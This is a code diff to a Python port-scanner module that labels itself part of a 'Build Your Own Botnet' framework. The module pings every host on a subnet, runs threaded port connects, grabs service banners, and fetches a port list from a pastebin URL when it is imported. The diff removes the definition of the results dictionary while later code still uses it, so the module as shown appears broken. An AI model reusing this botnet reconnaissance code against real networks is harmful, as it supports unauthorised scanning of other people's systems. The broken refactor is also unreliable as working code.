@@ -17,7 +17,6 @@ import Queue
 import socket
 import random
 import urllib
-import colorama
 import argparse
 import threading
 import subprocess
@@ -29,18 +28,14 @@ import util
 
 # globals
 
-__tasks     = Queue.Queue()
-__ports     = json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read())
-__parser    = argparse.ArgumentParser(prog='portscan.py', description='Port Scanner (Build Your Own Botnet)', version='0.1.2', add_help=True)
-__threads   = collections.OrderedDict()
-__lock      = threading.Lock()
-__verbose   = False
-__targets   = []
-__results   = {}
-
-
-colorama.init(autoreset=False)
-
+packages  = []
+platforms = ['win32','linux2','darwin']
+tasks     = Queue.Queue()
+ports     = json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read())
+threads   = collections.OrderedDict()
+targets   = []
+util.is_compatible(platforms, __name__)
+util.imports(packages)
 
 @util.threaded
 def _threader(tasks):
@@ -76,9 +71,9 @@ def _scan(target):
         if data:
             data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
             data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')
-            item = { str(target.port) : { 'protocol': __ports[str(target.port)]['protocol'], 'service': data, 'state': 'open'}}
+            item = { str(target.port) : { 'protocol': globals()['ports'][str(target.port)]['protocol'], 'service': data, 'state': 'open'}}
         else:
-            item = { str(target.port) : { 'protocol': __ports[str(target.port)]['protocol'], 'service': __ports[str(target.port)]['service'], 'state': 'open'}}
+            item = { str(target.port) : { 'protocol': globals()['ports'][str(target.port)]['protocol'], 'service': globals()['ports'][str(target.port)]['service'], 'state': 'open'}}
         __results.get(target.host).update(item)
     except (socket.error, socket.timeout):
         pass
@@ -104,19 +99,19 @@ def run(target='127.0.0.1', subnet=False, ports=[21,22,23,25,80,110,111,135,139,
         if subnet:
             for x in range(1,255):
                 if _ping(stub % x):
-                    __targets.append(stub % x)
+                    globals()['targets'].append(stub % x)
                     for port in ports:
-                        __tasks.put_nowait((_scan, task(stub % x, port)))
+                        globals()['tasks'].put_nowait((_scan, task(stub % x, port)))
         else:
-            __targets.append(target)
+            globals()['targets'].append(target)
             if _ping(target):
                 for port in ports:
-                    __tasks.put_nowait((_scan, task(target, port)))
-        if __tasks.qsize():
-            for i in range(1, int((__tasks.qsize() / 100) if __tasks.qsize() >= 100 else 1)):
-                __threads['portscan-%d' % i] = _threader(__tasks)
+                    globals()['tasks'].put_nowait((_scan, task(target, port)))
+        if globals()['tasks'].qsize():
+            for i in range(1, int((globals()['tasks'].qsize() / 100) if globals()['tasks'].qsize() >= 100 else 1)):
+                threads['portscan-%d' % i] = _threader(globals()['tasks'])
             if __results and len(__results):
-                return dict({k: __results[k] for k in sorted(__results.keys()) if k in __targets})
+                return dict({k: __results[k] for k in sorted(__results.keys()) if k in globals()['targets']})
             else:
                 return "Target(s) offline"
     except Exception as e:
